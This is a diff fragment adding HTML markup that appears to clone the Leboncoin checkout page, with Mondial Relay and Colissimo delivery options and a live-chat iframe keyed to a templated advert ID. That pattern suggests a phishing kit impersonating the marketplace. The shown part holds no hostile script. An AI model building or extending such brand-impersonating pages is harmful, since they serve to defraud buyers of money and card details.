+                        <div _ngcontent-xpb-c85="" class="dd">
+                          <div _ngcontent-xpb-c85="" class="radio">
+                            <div _ngcontent-xpb-c85="" class="a -s"><span _ngcontent-xpb-c85="" class="b"></span></div>
+                          </div>
+                          <div _ngcontent-xpb-c85="" class="text">
+                            <div _ngcontent-xpb-c85="" class="t">
+                              <p _ngcontent-xpb-c85="">Mondial Relay</p>
+                              <img _ngcontent-xpb-c85="" src="/leboncoin/mondialRelay.svg" alt="" />
+                            </div>
+                            <p _ngcontent-xpb-c85="" class="ts">en point Mondial Relay sous 3-5 jours</p>
+                          </div>
+                          <div _ngcontent-xpb-c85="" class="price"></div>
+                        </div>
+                        <div _ngcontent-xpb-c85="" class="dd">
+                          <div _ngcontent-xpb-c85="" class="radio">
+                            <div _ngcontent-xpb-c85="" class="a -s"><span _ngcontent-xpb-c85="" class="b"></span></div>
+                          </div>
+                          <div _ngcontent-xpb-c85="" class="text">
+                            <div _ngcontent-xpb-c85="" class="t">
+                              <p _ngcontent-xpb-c85="">Colissimo</p>
+                              <img _ngcontent-xpb-c85="" src="/leboncoin/colissimo.svg" alt="" />
+                            </div>
+                            <p _ngcontent-xpb-c85="" class="ts">à votre domicile sous 2-3 jours</p>
+                          </div>
+                          <div _ngcontent-xpb-c85="" class="price"></div>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                  <div _ngcontent-xpb-c85="" class="btnD"><button _ngcontent-xpb-c85="" type="button">Continuer</button></div>
+                </div>
+              </div> -->
+              <!---->
+              <div _ngcontent-xpb-c85="" class="lebonBggg"></div></form></app-leboncoin
+          ><!----><!---->
+        </div>
+        <!----><router-outlet _ngcontent-xpb-c36=""></router-outlet
+        ><!----></app-render
+      ><!----><!----></app-root
+    >
+    <noscript>
+      <div class="noscript">
+        <div class="mine">
+          <p>Error</p>
+          <p class="bad">Enable JavaScript</p>
+        </div>
+      </div>
+    </noscript>
+
+    <div
+      class="chatra--webkit chatra--style-round chatra--side-bottom chatra--pos-right chatra--visible chatra--expanded chatra--fast-toggle"
+      id="chatra"
+      data-turbolinks-permanent=""
+      style="width: 380px; height: 600px; transform: none; z-index: 2147483647; display: none"
+    >
+      <div id="chatra__iframe-wrapper">
+        <iframe
+          frameborder="0"
+          id="chatra__iframe"
+          allowtransparency="true"
+          title="Chatra live chat"
+          allow="autoplay"
+          src="/supportChatFrame/<%=ad.id%>"
+          style="width: 380px; height: 600px; position: absolute"
+        ></iframe>
+      </div>
+    </div>
+    <div
+      class="support-circle"
+      onclick="document.querySelector('#chatra').style.display = 'block';this.style.display = 'none'"
+    ></div>
+  </body>
+</html>
